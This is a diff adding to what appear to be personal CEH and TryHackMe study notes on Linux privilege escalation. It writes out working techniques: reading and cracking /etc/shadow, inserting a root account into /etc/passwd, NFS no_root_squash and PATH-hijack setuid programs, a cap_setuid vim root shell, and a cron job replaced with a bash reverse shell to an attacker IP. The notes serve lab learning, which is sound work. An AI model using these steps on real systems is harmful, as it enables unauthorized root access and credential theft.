@@ -250,6 +250,7 @@ Back on reverse shell listener
 >whoami
 ```
 
+https://tryhackme.com/r/room/linprivesc
 # Escalate Privileges by Exploiting Vulnerability in pkexec (CEH Lab)
 Run scripts remotely https://superuser.com/questions/130443/remotely-run-script-on-unix-get-output-locally
 
@@ -302,6 +303,8 @@ On Attacker
 Password from shoulder surfing, previous challenege, or hydra
 >whoami
 >sudo -l (look for NOPASSWD)
+Check https://gtfobins.github.io/
+Check for LD_PRELOAD (https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/)
 >sudo -u {user2} {command} (e.g. >sudo -u user2 /bin/bash)
 >whoami
 >cat flag file
@@ -341,11 +344,97 @@ Ref https://academy.hackthebox.com/module/77/section/844
 >stat -c "%a %A %U %G %F" {filename}
 Look for executable files or files with more permisssions
 >cp /bin/bash
+
+T: >find / -type f -perm -04000 -ls 2>/dev/null
+pre-filtered list https://gtfobins.github.io/#+suid
+
+If text editor is one of the list:
+T: nano /etc/shadow will print the contents of the /etc/shadow file. We can now use the unshadow tool to create a file crackable by John the Ripper. To achieve this, unshadow needs both the /etc/shadow and /etc/passwd files.
+A: >unshadow passwd.txt shadow.txt > passwords.txt
+OR
+>openssl passwd -1 -salt THM password1
+Add hash to /etc/passwd
+hacker:{HASH}:0:0:root:/root:/bin/bash
+>su hacker
+>{password1}
+>whoami
 ```
+
 
 # Escalate Privileges (multiple)
+NFS
+```
+Target: >cat /etc/exports
+Look for no_root_squash
+Attacker: >showmount -e {targetIP}
+A: >mkdir /tmp/targetmount
+A: >mount -o rw {targetIP}:/{no_root_squash folder} /tmp/targetmount
+A: >cd /tmp/targetmount
+A: >nano nfs.c
+int main()
+{  setgid(0);
+    setuid(0);
+    system("/binbash");
+    return 0;
+}
+A: >gcc nfs.c -o nfs -w
+A: >chmod +s nfs
+A: >ls -l nfs
+Target: >cd {no_root_squash folder}
+T: >./nfs
+T: >whoami
 ```
 
+Capabilities
+```
+T: >getcap -r / 2>/dev/null
+Look for cap_setuid
+https://gtfobins.github.io/#+capabilities
+>./vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+>id
+```
+
+Cronjob
+```
+T: >cat /etc/crontab
+Look for running as root
+T: >cat {schedule script}
+Replace with
+#!/bin/bash
+bash -i >& /dev/tcp/{attackerIP}/6666 0>&1
+
+Start listener
+A: >nc -nlvp 6666
+Wait....
+>whoami
+```
+
+Cronjob 2
+```
+If full path not defined, cron with look in PATH variable.
+```
+
+PATH
+```
+T: >find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
+T: >echo $PATH
+Look for crossover
+
+Create executable - T: >nano path_exp.c
+#include<unistd.h>
+void main()
+{ setuid(0);
+    setguid(0);
+    system("thm");
+}
+T: >gcc path_exp.c -o path -w
+T: >chmod u+s path
+T: >export PATH=/tmp:$PATH
+T: >cd /tmp
+T: >echo "/bin/bash" > thm
+T: >chmod 777 thm
+T: >ls -l thm
+T: >./path
 ```
 
 # Covert Communication
